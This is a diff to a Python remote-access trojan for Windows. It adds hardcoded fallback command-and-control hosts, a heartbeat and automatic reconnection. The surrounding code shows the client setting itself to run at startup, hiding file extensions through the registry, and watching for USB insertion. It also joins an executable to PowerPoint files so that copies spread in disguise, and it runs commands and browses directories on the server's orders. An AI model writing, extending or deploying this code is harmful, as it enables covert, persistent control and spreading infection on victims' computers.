@@ -21,8 +21,17 @@ from PIL import ImageGrab
 import random
 import string
 
+EGG = {
+    "ips": [
+        {"ip": "us-sjc-bgp-1.ofalias.org", "port": 60813},
+        {"ip": "kr-nc-bgp-1.ofalias.net", "port": 50738}
+    ]
+}
+
+
 def create_task_id():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+
 
 def clear_directory(directory: Path):
     for filename in os.listdir(directory):
@@ -32,11 +41,13 @@ def clear_directory(directory: Path):
         elif file_path.is_dir():
             shutil.rmtree(file_path)
 
+
 def is_usb_drive(drive_letter: str) -> bool:
     drive_type = win32file.GetDriveType(f"{drive_letter}:\\")
     if drive_type == win32file.DRIVE_REMOVABLE:
         return True
     return False
+
 
 def is_current_path_on_usb_drive() -> bool:
     current_path = Path.cwd()
@@ -47,6 +58,7 @@ def is_current_path_on_usb_drive() -> bool:
     else:
         return False
 
+
 def write_registry_value(key_path: str, value_name: str, value: str, value_type):
     try:
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
@@ -55,6 +67,7 @@ def write_registry_value(key_path: str, value_name: str, value: str, value_type)
         print(f"Value '{value_name}' has been written to the registry.")
     except PermissionError:
         print("Permission denied. You need to run this script as administrator.")
+
 
 class FileJoiner:
     def __init__(self, file1_path: Path, file2_path: Path, output_dir: Path):
@@ -65,7 +78,6 @@ class FileJoiner:
         self.py_file_spec = output_dir / "py_file.spec"
 
     def join_files(self):
-        # 使用 base64 编码代替十六进制
         with open(self.file1_path, 'rb') as file1:
             file1_base64 = base64.b64encode(file1.read()).decode('utf-8')
         with open(self.file2_path, 'rb') as file2:
@@ -85,7 +97,6 @@ import os
 
 def join(base64_data, file_name):
     temp_path = os.path.join(os.environ["TEMP"], file_name)
-    # 总是覆盖写入确保最新版本
     data = base64.b64decode(base64_data)
     with open(temp_path, "wb") as output_file:
         output_file.write(data)
@@ -133,24 +144,34 @@ join(file2_base64, r"{file2_name}")
     def clean_up(self):
         clear_directory(self.output_dir)
 
+
 class Client:
-    def __init__(self, ip: str, port: int):
+    def __init__(self, info: Dict):
         self.running = True
-        self.ip = ip
-        self.port = port
+        self.receive_running = True
+        self.info = info
+        self.ip = info["ips"][0]["ip"]
+        self.port = info["ips"][0]["port"]
         self.appdata_path = Path(os.getenv('APPDATA'))
-        self.temp_path = self.appdata_path / 'rc'
-        self.egg_path = self.appdata_path / 'egg'
-        self.self_path = self.appdata_path / 'rc.exe'
+        self.temp_path = self.appdata_path / 'crc'
+        self.egg_path = self.appdata_path / 'crc_info'
+        self.self_path = self.appdata_path / 'crc.exe'
         self.temp_path.mkdir(parents=True, exist_ok=True)
+
         self.remote_control_list = []
         self.id: Optional[str] = None
+        self.heartbeat_interval = 1  # 心跳间隔（秒）
+        self.allowable_intervals = 2  # 允许的最大间隔（秒）
+        self.last_send_heartbeat = time.time()  # 上次发送心跳的时间
+        self.server_last_heartbeat = time.time()  # 上次收到服务器心跳的时间
 
         self.initialize_client()
         self.setup_socket()
         self.start_threads()
         signal.signal(signal.SIGINT, self.handle_exit)
         signal.signal(signal.SIGTERM, self.handle_exit)
+
+        self.init_heartbeat()
 
         while self.running:
             time.sleep(0.5)
@@ -166,6 +187,9 @@ class Client:
         self.add_to_startup()
         self.hide_file_ext()
 
+    def init_heartbeat(self):
+        self.send_heartbeat()
+
     def __del__(self):
         self.close_socket()
         self.close_socket()
@@ -174,12 +198,19 @@ class Client:
         self.detect_usb_insertion_thread = threading.Thread(target=self.detect_usb_insertion, daemon=True)
         self.detect_usb_insertion_thread.start()
 
-        self.receive_thread = threading.Thread(target=self.receive_message, daemon=True)
-        self.receive_thread.start()
+        self.send_heartbea_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
+        self.send_heartbea_thread.start()
+
+        self.detect_server_is_onlien_thread = threading.Thread(target=self.detect_server_is_onlien, daemon=True)
+        self.detect_server_is_onlien_thread.start()
 
     def setup_socket(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.connect((self.ip, self.port))
+
+        self.receive_thread = threading.Thread(target=self.receive_message, daemon=True)
+        self.receive_thread.start()
+
         self.init_control()
 
     def send_message(self, message: Dict[str, Any]) -> None:
@@ -191,7 +222,7 @@ class Client:
 
     def receive_message(self) -> None:
         buffer = ""
-        while self.running:
+        while self.running and self.receive_running:
 
             data = self.socket.recv(1048576).decode('utf-8')
             if not data:
@@ -204,7 +235,6 @@ class Client:
                     buffer = buffer[idx:].lstrip()
                 except ValueError:
                     break
-
 
     def directory(self, data: Dict[str, Any]) -> None:
         root_path = Path(data["data"]["root"])
@@ -355,7 +385,6 @@ class Client:
     def stop_remote_control(self, data):
         remote_control_info = self.get_remote_control(data["data"]["remote_control_id"])
         if remote_control_info:
-
             self.remote_control_list.remove(remote_control_info)
 
     def run(self, data: Dict[str, Any]) -> None:
@@ -415,9 +444,29 @@ class Client:
             kill_process = multiprocessing.Process(target=self.kill_self_process, args=())
             kill_process.start()
 
+    def reconnect_to_server(self):
+        self.close_socket()
+        self.receive_running = False
+        i = 0
+        while self.running:
+            try:
+                self.ip = self.info["ips"][i]["ip"]
+                self.port = self.info["ips"][i]["port"]
+                self.setup_socket()
+                break
+            except Exception:
+                time.sleep(5)
+
+    def detect_server_is_onlien(self) -> None:
+        while True:
+            if self.server_last_heartbeat - self.last_send_heartbeat > self.allowable_intervals:
+                self.reconnect_to_server()
+
     def handle_message(self, data: Dict[str, Any]) -> None:
         if data["mode"] == "init":
             self.id = data["id"]
+        elif data["mode"] == "back_heartbeat":
+            self.server_last_heartbeat = time.time()
         elif data["mode"] == "kill_self":
             self.kill_self()
         elif data["mode"] == "directory":
@@ -459,10 +508,6 @@ class Client:
             file_joiner.join_files()
             exe_path = file_joiner.get_exe_path()
 
-            if not exe_path.exists():
-                print(f"生成的 EXE 文件不存在: {exe_path}")
-                continue
-
             new_exe_path = ppt_path.parent / f"{ppt_name}.exe"
             new_exe_path.parent.mkdir(parents=True, exist_ok=True)
             shutil.move(str(exe_path), str(new_exe_path))
@@ -494,10 +539,17 @@ class Client:
                 winreg.SetValueEx(key, "rc", 0, winreg.REG_SZ, str(self.self_path))
 
     def hide_file_ext(self):
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0,
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
+                             0,
                              winreg.KEY_WRITE)
         winreg.SetValueEx(key, "HideFileExt", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(key)
 
+    def send_heartbeat(self):
+        while True:
+            self.send_message({"mode": "heartbeat"})
+            self.last_send_heartbeat = time.time()
+            time.sleep(self.heartbeat_interval)
+
 if __name__ == "__main__":
-    client = Client("us-sjc-bgp-1.ofalias.org", 60813)
+    client = Client(EGG)
